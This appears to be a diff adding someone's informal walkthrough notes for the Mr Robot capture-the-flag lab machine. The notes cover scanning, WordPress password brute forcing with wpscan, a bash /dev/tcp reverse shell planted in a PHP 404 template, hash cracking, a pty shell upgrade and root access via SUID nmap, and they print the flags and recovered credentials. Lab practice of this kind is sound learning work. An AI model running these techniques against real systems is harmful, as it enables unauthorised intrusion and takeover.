@@ -1,0 +1,106 @@
+ifconfig -> 192.168.56.104
+
+netdiscover -r 192.168.56.0/24 -i eth1
+
+target -> 192.168.56.121
+
+nmap -sC -sV -A -T4 -p- 192.168.56.121
+
+22 closed, 80 & 443 open
+
+nikto + dirb it
+
+while that runs, go to 192.168.56.121/robots.txt
+	fsocity.dic
+	key-1-of-3.txt
+
+192.168.56.121/key-1-of-3.txt
+	FIRST FLAG: 073403c8a58a1f80d943455fb30724b9
+
+192.168.56.121/fsocity.dic
+	downloads a dictionary file -> looks like a bunch of repeats
+cat foscity.dic | sort | uniq -u > pass.wd
+	unique list of passwords
+
+look at dirb/nikto scan, find /0 directory
+	-> leads to a wp-site
+
+wp sites = wpscan time
+
+wpscan --url 192.168.56.121
+	gives us a bunch of exploits, but lets try to find a login page first
+
+found it, so lets try to brute force with our passwords
+wpscan --url 192.168.56.121 --passwords pass.wd --usernames admin
+	-> no hits
+ok this is mr robot CTF...let's try elliot
+wpscan --url 192.168.56.121 --passwords pass.wd --usernames elliot
+	->elliot:ER28-0652
+bingoooooo
+
+login to wpsite using creds
+
+poke around, go to apperance
+
+editor
+
+oh look a 404 template
+
+404 template is running php wtf why
+
+add php reverse shell to it: exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.104/12345 0>&1'")
+
+now if we 404 the site we get a reverse shell
+
+start listener: nc -lvp 12345
+
+go to 192.168.56.121/lol
+
+boom reverse shell babyyyyyyyyyyyy
+ls -> not much, lets cd around
+cd ~/../../home/robot
+
+cat key-2-of-3.txt -> permission denied
+cat password.raw-md5
+	-> robot:c3fcd3d76192e4007dfb496cca67e13b
+google reverse md5 has of that hash -> abcdefghijklmnopqrstuvwxyz
+
+su robot -> must be run from terminal
+
+python --version -> works ok lets spawn a shell
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+nice, now lets su robot
+
+we in
+
+cat key-2-of-3.txt -> FLAG2: 822c73956184f694993bede3eb39f959
+
+ok we still need to get root
+lets see what we have
+
+sudo -l
+	-> sorry, user robot may not run sudo on linux
+uhhh ok...lets go check in stuff
+
+find / -perm -4000 -type f 2>/dev/null
+	nmap, wtf
+
+nmap --version -> 3.81
+	some interactive shell that lets us run our own commands
+
+nmap --interactive
+
+!/bin/sh
+
+new shell...
+whoami
+root
+
+gg
+
+cd to root
+
+cat key-3-of-3.txt
+	-> 04787ddef27c3dee1ee161b21670b4e4
